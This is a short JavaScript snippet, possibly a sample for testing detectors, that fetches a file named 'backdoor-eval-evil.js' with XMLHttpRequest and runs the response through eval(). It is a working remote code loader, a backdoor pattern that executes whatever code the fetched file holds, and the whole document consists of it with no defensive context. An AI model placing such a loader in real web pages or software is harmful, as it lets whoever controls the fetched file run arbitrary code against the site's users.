var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    eval(this.responseText);
  }
};
xhttp.open("GET", "backdoor-eval-evil.js", true);
xhttp.send();
